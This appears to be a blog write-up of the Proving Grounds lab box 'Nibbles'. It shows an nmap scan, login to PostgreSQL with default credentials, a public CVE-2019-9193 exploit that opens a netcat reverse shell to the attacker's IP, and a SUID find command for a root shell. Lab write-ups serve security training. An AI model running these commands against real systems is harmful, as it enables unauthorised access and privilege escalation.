---
title: "PG Practice - Nibbles"
date: 2026-06-18
draft: false
tags: ["Proving Grounds Practice", "Windows", "Write-Up"]
cover:
    image: "/images/writeup_screens/pg_nibbles/pg_nibbles_cover.svg"      
    alt: "Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| Difficulty | Intermediate |
| Type | Linux |

**Port Scan**
```
└─$ nmap -sV -sC -p- 192.168.120.47
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
|_http-title: Enter a title, displayed at the top of the window.
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
|_ssl-date: TLS randomness does not represent time
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Local

The PostgresSQL service on port 5437 has default credentials set:

```
postgres:postgres
```

![](/images/writeup_screens/pg_nibbles/pg_nibbles1.png)

I found out that the version **11.7** is vulnerable to **CVE-2019-9193** which is an authenticated RCE for which i found this [public exploit](https://github.com/b4keSn4ke/CVE-2019-9193).

![](/images/writeup_screens/pg_nibbles/pg_nibbles2.png)

I used the following command to receive a reverse shell as user **postgres** on the target:

```
└─$ python3 cve-2019-9193.py -i 192.168.120.47 -p 5437 -U postgres -P postgres -c 'busybox nc 192.168.45.198 80 -e /bin/bash' 
```

We have read privileges on the home directory of wilson so we can read _/home/wilson/local.txt_.


## Proof

By analysing the output of `$ find / -perm -u=s -type f 2>/dev/null` we can see that the SUID bit for _/usr/bin/find_ is set: 

![](/images/writeup_screens/pg_nibbles/pg_nibbles3.png)

If we search for this binary in [GTFOBins](https://gtfobins.org/gtfobins/find/) we can find the following command for escalating to a root shell when SUID is set: 

```
$ find . -exec /bin/sh -p \; -quit
```

It worked and I was able to read _/root/proof.txt_